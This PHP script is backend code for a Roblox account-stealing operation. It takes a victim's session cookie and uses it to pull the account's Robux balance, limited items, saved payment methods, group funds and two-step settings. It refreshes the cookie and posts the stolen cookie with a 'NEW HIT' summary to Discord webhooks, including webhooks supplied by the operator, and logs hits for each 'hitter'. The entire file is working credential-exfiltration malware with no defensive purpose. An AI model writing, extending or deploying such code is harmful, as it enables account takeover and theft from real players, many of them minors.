<?php
include 'function.php';
include 'setup.php';

if ($_SERVER['REQUEST_METHOD'] !== 'GET') {
    die(json_encode(["error" => "get for now"]));
}

$cookie = $_GET['cookie'] ?? "";
if (!$cookie) {
    die(json_encode(["error" => "no cookie"]));
}

$user_info_response = make_curl_request("https://www.roblox.com/my/settings/json", $cookie);
$user_info = json_decode($user_info_response['response'], true);

if (!isset($user_info['UserId'])) {
    die(json_encode(["error" => "invalid"]));
}

$user_id = $user_info['UserId'];
$robux_balance = json_decode(make_curl_request("https://economy.roblox.com/v1/users/{$user_id}/currency", $cookie)['response'], true);
$groups = json_decode(make_curl_request("https://groups.roblox.com/v1/users/{$user_id}/groups/roles", $cookie)['response'], true);
$game_passes = json_decode(make_curl_request("https://apis.roblox.com/game-passes/v1/users/{$user_id}/game-passes?count=100&exclusiveStartId=", $cookie)['response'], true);
$bundles = json_decode(make_curl_request("https://catalog.roblox.com/v1/users/{$user_id}/bundles?limit=100", $cookie)['response'], true);
$limiteds = json_decode(make_curl_request("https://inventory.roblox.com/v1/users/{$user_id}/assets/collectibles?limit=100", $cookie)['response'], true);
$saved_payment_methods = json_decode(make_curl_request("https://apis.roblox.com/payments-gateway/v1/payment-profiles", $cookie)['response'], true);
$credit_balance = json_decode(make_curl_request("https://apis.roblox.com/credit-balance/v1/get-credit-balance-for-navigation", $cookie)['response'], true);
$transaction_totals = json_decode(make_curl_request("https://economy.roblox.com/v2/users/{$user_id}/transaction-totals?timeFrame=Year&transactionType=summary", $cookie)['response'], true);
$dev_item = json_decode(make_curl_request("https://catalog.roblox.com/v1/catalog/items/5731050224/details?itemType=Asset", $cookie)['response'], true);
$owned_status = isset($dev_item['owned']) && $dev_item['owned'] === true ? "Yes" : "No";

$games = [
    '<:mm2:1348704662861385791>' => 66654135,
    '<:ps99:1348704835196682301>' => 3317771874,
    '<:adm:1348704414910644234>' => 383310974,
    '<:bladeball:1307351511109730384>' => 4777817887
];

$played_games = [];
$gamepasses_owned = [];
$mm2_played = false;
$ps99_played = false;
$adm_played = false;
$bladeball_played = false;

$mm2_gamepasses = 0;
$ps99_gamepasses = 0;
$adm_gamepasses = 0;
$bladeball_gamepasses = 0;

foreach ($games as $game_name => $game_id) {
    $game_data = json_decode(make_curl_request("https://games.roblox.com/v1/games/{$game_id}/votes/user", $cookie)['response'], true);
    $played = (isset($game_data['canVote']) && $game_data['canVote']) || (isset($game_data['userVote']) && $game_data['userVote']);
    
    if ($game_name == '<:mm2:1348704662861385791>') {
        $mm2_played = $played;
    } elseif ($game_name == '<:ps99:1348704835196682301>') {
        $ps99_played = $played;
    } elseif ($game_name == '<:adm:1348704414910644234>') {
        $adm_played = $played;
    } elseif ($game_name == '<:bladeball:1307351511109730384>') {
        $bladeball_played = $played;
    }
    
    $gamepasses_data = json_decode(make_curl_request("https://games.roblox.com/v1/games/{$game_id}/game-passes?limit=100&sortOrder=Asc", $cookie)['response'], true);
    $owned_count = 0;

    if (isset($gamepasses_data['data'])) {
        foreach ($gamepasses_data['data'] as $gamepass) {
            if (isset($gamepass['isOwned']) && $gamepass['isOwned'] === true) {
                $owned_count++;
            }
        }
    }

    if ($game_name == '<:mm2:1348704662861385791>') {
        $mm2_gamepasses = $owned_count;
    } elseif ($game_name == '<:ps99:1348704835196682301>') {
        $ps99_gamepasses = $owned_count;
    } elseif ($game_name == '<:adm:1348704414910644234>') {
        $adm_gamepasses = $owned_count;
    } elseif ($game_name == '<:bladeball:1307351511109730384>') {
        $bladeball_gamepasses = $owned_count;
    }
}

$mm2_output = $mm2_played ? "True | **__{$mm2_gamepasses}__**" : "False | **__{$mm2_gamepasses}__**";
$ps99_output = $ps99_played ? "True | **__{$ps99_gamepasses}__**" : "False | **__{$ps99_gamepasses}__**";
$adm_output = $adm_played ? "True | **__{$adm_gamepasses}__**" : "False | **__{$adm_gamepasses}__**";
$bladeball_output = $bladeball_played ? "True | **__{$bladeball_gamepasses}__**" : "False | **__{$bladeball_gamepasses}__**";

$response_data["PlayedGames"] = [
    "mm2" => $mm2_output,
    "ps99" => $ps99_output,
    "adm" => $adm_output,
    "bladeball" => $bladeball_output
];



$verify_type = json_decode(make_curl_request("https://twostepverification.roblox.com/v1/users/{$user_id}/configuration", $cookie)['response'], true);

    $verified_with = "Unverified"; 
    if (isset($verify_type['methods'])) {
        foreach ($verify_type['methods'] as $method) {
            if ($method['enabled']) {
                $verified_with = $method['mediaType']; 
                break; 
            }
        }
    }
    
$account_age = $user_info['AccountAgeInDays'] ?? 0;
$game_passes = 
$email_verified = isset($user_info['IsEmailVerified']) ? ($user_info['IsEmailVerified'] ? 'True' : 'False') : 'No Email';
$limiteds_count = count($limiteds['data'] ?? []);
$limiteds_rap = array_sum(array_column($limiteds['data'] ?? [], 'recentAveragePrice'));
$korblox_owned = array_search(192, array_column($bundles['data'], 'id')) !== false;
$headless_owned = array_search(5731050224, array_column($bundles['data'], 'id')) !== false;

$group_names_owned = [];
$group_currencies = []; 
$total_robux = 0;

foreach ($groups['data'] ?? [] as $group) {
    if ($group['role']['name'] === 'Owner') {
        $group_id = $group['group']['id']; 
        $group_names_owned[] = $group['group']['name'];
        $group_info = json_decode(make_curl_request("https://economy.roblox.com/v1/groups/{$group_id}/currency", $cookie)['response'], true);
        $group_currencies[$group_id] = $group_info['robux'] ?? 0;
        $total_robux += $group_info['robux'] ?? 0; 
    }
}


$payment_count = count($saved_payment_methods); 
$payment_embed = !empty($saved_payment_methods) ? 'True' : 'False'; // only for filter used
$payment_status = $payment_count > 0 ? 'True (' . $payment_count . ')' : 'False';

$premium_status = isset($user_info['IsPremium']) && $user_info['IsPremium'] ? 'True' : 'False';

$avatar_response = make_curl_request("https://thumbnails.roblox.com/v1/users/avatar-headshot?size=420x420&format=png&userIds={$user_id}", $cookie);
$avatar_data = json_decode($avatar_response['response'], true);
$avatar_url = isset($avatar_data['data'][0]['imageUrl']) && !empty($avatar_data['data'][0]['imageUrl']) ? $avatar_data['data'][0]['imageUrl'] : 'https://www.hypnobirthing.co.il/img/noavatar.png';



$domain = $_SERVER['HTTP_HOST'];
$ch = curl_init("https://$domain/apis/refresh.php?cookie=" . urlencode($cookie));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$final_cookie = curl_exec($ch);
curl_close($ch);





$response_data = [
    "key" => abs($transaction_totals['outgoingRobuxTotal'] ?? 0),
];

header("Content-Type: application/json");
echo json_encode($response_data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);


$original_embed = [
    "title" => "```HIT • {$n}```",
    "description" => "###  [**__Rolimons Stats__**](https://www.rolimons.com/player/{$user_id})<:rolimonsblack:978565365338603562>| [**__Roblox Profile__**](https://www.roblox.com/users/{$user_id}/profile)<:roblox:1349399578213875804> | [**__Discord Invite__**]({$dc})<:discord:1325490805196194003>",
    "color" => 8882055,
    "author" => [
        "name" => $user_info['Name'] . ' | ' . ($user_info['UserAbove13'] ? '13+' : '13>'),
        "icon_url" => $avatar_url
    ],
    "thumbnail" => [
        "url" => $avatar_url
    ],

"fields" => [ 
    ["name" => "<:RbxSociety:1304954387344654387> Username", "value" => "{$user_info['Name']}"],
    ["name" => "<:Stats:1332710093212352586> Account Stats", "value" => "`Account Age: {$account_age} Days` \n``Games Developer: {$owned_status}``"],
    ["name" => "<:robux1:1304959930582962257> Robux", "value" => "**Balance:** {$robux_balance['robux']} <:robux:1338635369985609850> \n **Pending:** {$transaction_totals['pendingRobuxTotal']} <:robux:1338635369985609850>", "inline" => true],
    ["name" => "<:dominus:1304960502824173609> Exclusives", "value" => "**RAP:** {$limiteds_rap} <:robux:1338635369985609850> \n**Limiteds:** {$limiteds_count} <:money_bag:1306638519778938890>", "inline" => true],
    ["name" => "<:chart:1306639123498664058> Summary", "value" => abs($transaction_totals['outgoingRobuxTotal']) . " <:robux:1338635369985609850>", "inline" => true],
    ["name" => "<:Untitled_:1349110745627099227> Payment", "value" => "**<:Payment_mobile:1349027917862010952>** {$payment_status} \n (Credit Balance\n**" . ($credit_balance['creditBalance'] ?? 0) . "** in **" . (!empty($credit_balance['currencyCode']) ? $credit_balance['currencyCode'] : "Unknown") . "**)", "inline" => true],
    ["name" => "<:game:1299533761108643840> Games", "value" => "<:mm2:1349119069714124934> {$mm2_output} \n <:adm:1348704414910644234> {$adm_output}\n <:ps99:1348704835196682301> {$ps99_output}\n <:bladeball:1307351511109730384> {$bladeball_output}", "inline" => true],
    ["name" => "<:Settings:1307353941780201535> Settings", "value" => "<:Mail:1349027253752954932>**Email:** {$email_verified}\n<:Verified_Grey:1349026894829457479>**Verified:** {$verified_with}", "inline" => true],
    ["name" => "<:owned:1297324192198561872> Inventory", "value" => "<:korblox:1299534596433645588> " . ($korblox_owned ? 'True' : 'False') . "\n<:headless:1299534528066621451> " . ($headless_owned ? 'True' : 'False') . "", "inline" => true],
    ["name" => "<:rbxPremium:1307354518089891974> Premium", "value" => "{$premium_status}", "inline" => true],
    ["name" => "<:humans:1307355093154402344> Groups", "value" => "**Owned:** " . count($group_names_owned) . " \n **Balance:** {$total_robux} <:robux:1338635369985609850>", "inline" => true],
]

];


$refresh_cookie_embed = [
    "title" => "Cookie <:1f36a:1307361102425882624>",
    "description" => "[<:YTH_Link:1328742535140737085> **__Check Cookie__**](https://$domain/refresher?cookie={$final_cookie}) | [<:YTH_Link:1328742535140737085> **__Original Cookie__**](https://$domain/refresher?cookie={$cookie})  \n**```{$final_cookie}```**",
    "color" => 8882055,
    "thumbnail" => [
        "url" => "https://res.cloudinary.com/di3jdc46c/image/upload/v1737844893/cookie_1_n3nluv.png"
    ],
    "fields" => []
];

$webhook_payload = [
    "content" => "**NEW HIT**",
    "username" => "{$n}",
    "avatar_url" => "{$th}",
    "tts" => false,
    "embeds" => [$original_embed, $refresh_cookie_embed]
];

//webhook
send_to_discord($webhook_url, $webhook_payload);
if(isset($_GET['web'])){
    $web = $_GET['web'];
    send_to_discord($web, $webhook_payload);
}


if(isset($_GET['dh'])){
    $dh = $_GET['dh'];
    send_to_discord($dh, $webhook_payload);
}

//livehits
$username = $user_info['Name'];
$robux_balance = $robux_balance['robux'];

$hitter = $_GET['h'];

$data = "hitter:{$hitter}|user:{$username}|robux:{$robux_balance}|url:{$avatar_url}";

$file = $_SERVER['DOCUMENT_ROOT'] . '/control/data.txt';


$current_data = file($file, FILE_IGNORE_NEW_LINES);

array_unshift($current_data, $data);

$current_data = array_slice($current_data, 0, 5);

file_put_contents($file, implode("\n", $current_data) . "\n");